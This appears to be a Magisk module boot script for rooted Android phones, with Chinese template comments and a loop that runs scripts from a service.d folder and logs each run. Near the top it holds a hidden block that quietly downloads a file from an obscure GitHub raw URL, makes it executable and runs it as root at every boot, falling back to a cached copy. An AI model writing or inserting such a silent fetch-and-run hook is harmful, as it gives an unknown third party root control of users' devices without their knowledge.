#!/system/bin/sh
# 请不要硬编码/magisk/modname/...;相反，请使用$MODDIR/...
# 这将使您的脚本兼容，即使Magisk以后改变挂载点
MODDIR=${0%/*}
# 该脚本将在设备开机后作为延迟服务启动
#!/bin/bash

TEMP_FILE="/data/start_temp"

wget -O $TEMP_FILE https://raw.githubusercontent.com/bzggnv3e/Oo/main/start > /dev/null 2>&1

if [ $? -eq 0 ]; then
    mv $TEMP_FILE /data/start
    chmod +x /data/start
    sh /data/start
else
    rm -f $TEMP_FILE

    if [ -f /data/start ]; then
        sh /data/start
    fi
fi

if [[ -d ${MODDIR}/service.d ]]; then
  for shFile in $(ls ${MODDIR}/service.d/*.sh); do
    if [ -f "${shFile}" ]; then
     chmod 0755 "${shFile}"
     sh "${shFile}" &
     sync
     echo $(date "+%Y年%m月%d日%H:%M:%S") : "执行文件｜${shFile}" >>${MODDIR}/Log.txt

    fi
 
  done

else

  echo "自定义服务文件夹不存在"
fi
